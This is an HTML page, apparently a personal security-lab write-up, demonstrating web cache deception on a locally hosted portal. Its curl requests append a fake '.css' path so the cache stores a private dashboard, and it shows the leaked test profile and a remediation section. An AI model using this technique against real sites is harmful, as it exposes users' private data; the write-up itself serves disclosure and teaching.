@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO & META DATA -->
+    <title>Analysis: Web Cache Deception | Research Lab</title>
+    <meta name="description" content="Technical analysis of Information Disclosure via Web Cache Deception conducted in a controlled environment by Primandito Adi Setiya.">
+    <meta name="robots" content="index, follow">
+
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --accent: #ff5555;
+            --border: #222;
+            --text-main: #f0f0f0;
+            --text-dim: #888;
+            --code-green: #00ff41;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); line-height: 1.7; padding: 40px 20px; }
+        .container { max-width: 850px; margin: 0 auto; }
+
+        /* Navigation */
+        .back-nav { margin-bottom: 40px; }
+        .back-link { font-family: 'IBM Plex Mono', monospace; color: var(--accent); text-decoration: none; font-size: 0.8rem; border: 1px solid var(--accent); padding: 8px 15px; transition: 0.3s; }
+        .back-link:hover { background: var(--accent); color: #fff; }
+
+        header { margin-bottom: 50px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+        h1 { font-family: 'IBM Plex Mono', monospace; font-size: clamp(1.4rem, 4vw, 1.8rem); margin-bottom: 10px; color: #fff; }
+        .meta-info { font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: var(--text-dim); display: flex; gap: 20px; flex-wrap: wrap; }
+        .meta-info span b { color: var(--accent); }
+
+        /* Summary Box */
+        .summary-box { background: #111; border: 1px solid var(--border); padding: 25px; margin-bottom: 40px; }
+        .summary-box h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1rem; color: #fff; margin-bottom: 10px; border-left: 3px solid var(--accent); padding-left: 15px; }
+        .summary-box p { font-size: 0.95rem; color: #ccc; }
+
+        /* Video Section */
+        .video-section { margin-bottom: 60px; }
+        .video-container { width: 100%; aspect-ratio: 16/9; background: #000; border: 1px solid var(--border); position: relative; margin-top: 15px; }
+        .video-container iframe { position: absolute; top:0; left:0; width:100%; height:100%; border:none; }
+
+        /* Technical Content */
+        section { margin-bottom: 50px; }
+        h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1.1rem; color: #fff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        h2::before { content: "> "; color: var(--accent); }
+
+        pre { background: #000; border: 1px solid var(--border); padding: 20px; overflow-x: auto; margin: 20px 0; position: relative; }
+        code { font-family: 'IBM Plex Mono', monospace; font-size: 0.9rem; color: var(--code-green); }
+        .code-label { position: absolute; top: 0; right: 0; background: var(--border); color: #666; font-size: 0.6rem; padding: 3px 10px; font-family: 'IBM Plex Mono', monospace; }
+
+        .highlight { color: var(--accent); font-weight: 500; }
+
+        footer { margin-top: 100px; padding-top: 30px; border-top: 1px solid var(--border); text-align: center; font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: #444; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <nav class="back-nav">
+            <a href="../index.html" class="back-link">[ BACK_TO_LAB_INDEX ]</a>
+        </nav>
+
+        <header>
+            <h1>Information Disclosure via Web Cache Deception</h1>
+            <div class="meta-info">
+                <span>DATE: <b>2026-07-27</b></span>
+                <span>SEVERITY: <b>MEDIUM</b></span>
+                <span>CATEGORY: <b>CACHE_ATTACK / INFO_DISCLOSURE</b></span>
+            </div>
+        </header>
+
+        <!-- SUMMARY & IMPACT -->
+        <div class="summary-box">
+            <h2>EXECUTIVE SUMMARY</h2>
+            <p>
+                This analysis explores a <strong>Web Cache Deception (WCD)</strong> vulnerability within the AstraCloud Infrastructure Portal. The vulnerability arises when a misconfigured cache layer (CDN/Load Balancer) is tricked into storing private user dashboards as publicly accessible static files. By manipulating URL paths with static extensions, an unauthenticated attacker can leak sensitive PII, including <strong>Full Names and Organization Emails</strong>.
+            </p>
+        </div>
+
+        <!-- FULL POC VIDEO -->
+        <section class="video-section">
+            <h2>EXPLOITATION_POC (VIDEO)</h2>
+            <div class="video-container">
+                <!-- Replace VIDEO_ID with your YouTube ID -->
+                <iframe width="560" height="315" src="https://www.youtube.com/embed/UFpBQIKh8Ow?si=nmB9vpeyySa_x_ec" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+        </section>
+
+        <!-- TECHNICAL ANALYSIS / STEPS -->
+        <section>
+            <h2>TECHNICAL_WALKTHROUGH</h2>
+            <p>The discovery was made by observing how the infrastructure's cache server identifies assets based on file extensions, while the backend application continues to serve private content regardless of the URL suffix.</p>
+            
+            <p><b>1. Baseline Verification:</b> Inspecting the dashboard while authenticated with the test account (<code>testing@example.com</code>). The server returns <code>X-Cache: BYPASS</code> for the standard dynamic route.</p>
+
+            <pre><span class="code-label">CURL_BASELINE_CHECK</span><code>
+❯ curl -I http://127.0.0.1:5000/dashboard -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.8 Python/3.12.3
+Content-Type: text/html; charset=utf-8
+X-Cache: BYPASS
+Vary: Cookie</code></pre>
+
+            <p><b>2. Triggering the Cache:</b> By appending <code>/test.css</code> to the endpoint, the cache layer identifies it as a static asset. The first request results in a <code>MISS</code>, indicating the private dashboard is being stored in the public cache.</p>
+
+            <pre><span class="code-label">CURL_CACHE_TRIGGER</span><code>
+❯ curl -I http://127.0.0.1:5000/dashboard/test.css -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
+HTTP/1.1 200 OK
+X-Cache: MISS
+Vary: Cookie</code></pre>
+
+            <p><b>3. Confirming Cache Storage:</b> A subsequent request yields an <code>X-Cache: HIT</code>. The server is now serving the authenticated victim's dashboard content directly from the public cache.</p>
+
+            <pre><span class="code-label">CURL_CACHE_CONFIRMATION</span><code>
+❯ curl -I http://127.0.0.1:5000/dashboard/test.css -b "session=eyJ1c2VyX2VtYWlsIjoidGVzdGluZ0BleGFtcGxlLmNvbSJ9.amc3gQ.PAzl8uHdDz0Pejd0lZ1TbiF7R3M"
+HTTP/1.1 200 OK
+X-Cache: HIT</code></pre>
+
+            <p><b>4. Public Data Exfiltration:</b> Accessing the cached URL in an Incognito window (unauthenticated) successfully leaks the victim's <b>Organization Dashboard</b> data.</p>
+
+            <pre><span class="code-label">EXPOSED_DASHBOARD_STRUCTURE</span><code>
+&lt;!-- Extracted from the public cache response --&gt;
+&lt;div class="profile-card"&gt;
+    &lt;h5 class="text-white mb-4"&gt;Identity Information&lt;/h5&gt;
+    &lt;div class="row mb-3"&gt;
+        &lt;div class="col-4 text-muted small uppercase"&gt;Full Name&lt;/div&gt;
+        &lt;div class="col-8 fw-semibold"&gt;testing&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class="row mb-3"&gt;
+        &lt;div class="col-4 text-muted small"&gt;Organization Email&lt;/div&gt;
+        &lt;div class="col-8 fw-semibold"&gt;testing@example.com&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class="alert mt-4" style="background: rgba(240, 136, 62, 0.1);"&gt;
+        &lt;strong&gt;Security Note:&lt;/strong&gt; Double-factor authentication is recommended...
+    &lt;/div&gt;
+&lt;/div&gt;</code></pre>
+        </section>
+
+        <!-- REMEDIATION -->
+        <section>
+            <h2>REMEDIATION_STRATEGY</h2>
+            <p>
+                To mitigate this vulnerability, it is recommended to ensure that the <span class="highlight">Cache-Control</span> header is explicitly set to <code>no-store, private</code> for all authenticated pages. Additionally, the cache server should be configured to only cache files based on the actual <code>Content-Type</code> returned by the origin server rather than file extensions in the URL.
+            </p>
+        </section>
+
+        <footer>
+            © 2026 PRIMANDITO ADI SETIYA // SECURITY_RESEARCH_WRITEUP
+        </footer>
+    </div>
+
+</body>
+</html>
